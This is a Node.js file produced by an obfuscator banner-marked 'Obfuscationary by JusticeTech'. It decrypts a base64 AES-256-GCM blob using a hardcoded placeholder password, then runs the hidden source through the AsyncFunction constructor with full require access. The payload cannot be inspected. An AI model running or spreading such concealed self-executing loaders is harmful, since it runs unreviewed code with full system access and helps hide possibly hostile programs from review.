// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.0.3                                     ║
// ║  Encrypted: 2026-05-28 07:45:24 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.0.3
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='NgLRM6P9Mf9GDgUBv9ZFYo0y+FSx98ssIruzdJ7xoQ5MpnQHM/AXcKvetn31+4GRoS8igQIq2dhoDWH3XNV5zuKmQoTzO995RcAzkgiMFAXOIcgQsoMtZjT+vmD35ked1JrnsTJwApe2xwonrcPXJeh1d4nBvMkzH5wgpApyzT5SVD2r/rfa+z1/5ZXMpDelxNnoCwpkfBuTdXWJ8YbDjxhYiJZ4wy+fn9Oipdmt164kR3utMTJ8j4OfBrjbSPFrD5s81URcZM8AuWwhiKGXOJgDyj6ywFcd7Hz3d0toKXMUMbrrxOdFPBWpRoayLBaQ20X6Z3xfHfQIPI8J9tCxc0GElqRWDQSk/uPFawSUFAj6VJY3eqRGmkdLMsq1HlCmUHaEbY+YuxEOULbFq6CnWzE7v5QEfq7Kq2/g/8qPPC4vUBQm577e+/iDA/gNQaakrU3LqIbbtLGvZNCEmxzltHWEWZA8CYfJ4vD5fkY30DdBylzngnPdyr+eOExJkCa8Bsw5JOKQxNHMoer+PQnbJiSA3bfuby9FKohKfPczfmHsOvWfttYPSiwfD5nCs9wZVizNcRXoUsCigk+t9A7SQ0xv8M2xQ+XY2/ySIqw2a3pwY0ug/qx+85RGf8JGxzaFGvq6BMuLyTGy7CqlMaP1rkGtoOv6ura2WOLNc54ijhEW1Vn7mxuWWk4w0T+B9iLfPjAU9hzLh1EA1Ml/XDTozdYKRHWN1Kbl2+6Wv5c0v321kRUgyR0Z/B4gsZ2z5qHpTC2U5V50lU/TxU0xT9kNPdeCqgR5yxMsf7GQ1HAXpXGSzL7ZQCPUX9MjXlrfOA34HUMkloTzfs+synMGwM0uSgXePH3MmxcUPFAmntrGfrqdgmMzuZHC9Dl8qtzKSK7QQuBY6ZEJvES2HAnP2uSkLR/PrvoyEo/2I6K/JixQbI/BBJnndbAP0Bn49xSmhZpXiWZ4dazcO/gIa3D+GckhMzmyLCOOOlGo7srwPghsUktUA6/0QrFvV2stce/0r8sovQ==';const _IH='be8798de5cce86e5b59205e1827bf7523c2c07aea1d167741547a76f094a5223';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];const _ITS=50000;
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i],sl=_d.slice(0,16),iv=_d.slice(16,28),ct=_d.slice(28);
    const tg=ct.slice(ct.length-16),cd=ct.slice(0,ct.length-16);
    const kk=_c2.pbkdf2Sync(pw,sl,_ITS,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);dc.setAuthTag(tg);
    _d=Buffer.concat([dc.update(cd),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname',_src)(module,exports,require,__filename,__dirname);
})();
